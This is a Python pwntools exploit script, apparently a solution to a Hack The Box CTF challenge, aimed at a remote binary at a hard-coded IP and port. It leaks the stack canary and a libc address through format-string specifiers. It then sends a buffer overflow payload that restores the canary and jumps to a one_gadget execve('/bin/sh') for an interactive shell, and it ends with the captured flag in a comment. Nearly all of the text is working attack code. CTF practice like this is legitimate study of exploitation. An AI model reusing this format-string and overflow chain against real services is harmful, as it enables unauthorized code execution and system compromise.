from pwn import *

context.log_level = 'debug'

def detect(io):
	for i in range(40):
		svar = '%'+str(i+1)+'$p'
		io.recvuntil('2. Space food')
		io.sendline(b'1')
		io.recvuntil('3. Deathstar(70.00 s.rocks)')
		io.sendline(b'2')
		io.recvuntil('Red or Green Kryptonite?')
		io.sendline(svar.encode())
		if i+1 >= 9:
			io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
			io.sendline(b'n')

ip, port = '165.227.225.180',31422
io = remote(ip, port)

#io = process('./what_does_the_f_say')
#io = gdb.debug('./what_does_the_f_say', 'break main')

#sudo echo 0 > /proc/sys/kernel/randomize_va_space
#detect(io)

#check log.txt, find that %$23p is canary, and %$25p is __libc_star_main
#scanf "%s" can be overflowed

io.recvuntil('2. Space food')
io.sendline(b'1')
io.recvuntil('3. Deathstar(70.00 s.rocks)')
io.sendline(b'2')
io.recvuntil('Red or Green Kryptonite?')
io.sendline('%23$p'.encode())
io.recvline()
canary = int(io.recvline().decode().strip(),16)
#print(hex(canary))

io.recvuntil('2. Space food')
io.sendline(b'1')
io.recvuntil('3. Deathstar(70.00 s.rocks)')
io.sendline(b'2')
io.recvuntil('Red or Green Kryptonite?')
io.sendline('%25$p'.encode())
io.recvline()
libc_start_main = int(io.recvline().decode().strip(),16)
#print(hex(libc_start_main))

#https://libc.blukat.me/?q=__libc_start_main_ret%3A0x7f7e8581ab97&l=libc6_2.27-3ubuntu1.2_amd64

libc_base = libc_start_main - 0x021b97

'''
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
one_gadget = libc_base + 0x4f365
offset = 24
payload = offset*b'A'
payload += p64(canary)
payload += 8*b'A'
payload += p64(one_gadget)
#payload += 8*b'B'

#1 -> 1 works, but 1 -> 2 -> 1 doesn't work?? the canary offsets more 32 bytes...
for i in range(9):
	io.recvuntil('2. Space food')
	io.sendline(b'1')
	io.recvuntil('3. Deathstar(70.00 s.rocks)')
	io.sendline(b'1')

io.recvuntil('2. Space food')
io.sendline(b'1')
io.recvuntil('3. Deathstar(70.00 s.rocks)')
io.sendline(b'2')
io.recvuntil('Red or Green Kryptonite?')
io.sendline(b'2')
io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
io.sendline(payload)
io.interactive()
#HTB{th3_f_s4ys_f0rm4t_str1ng!!}
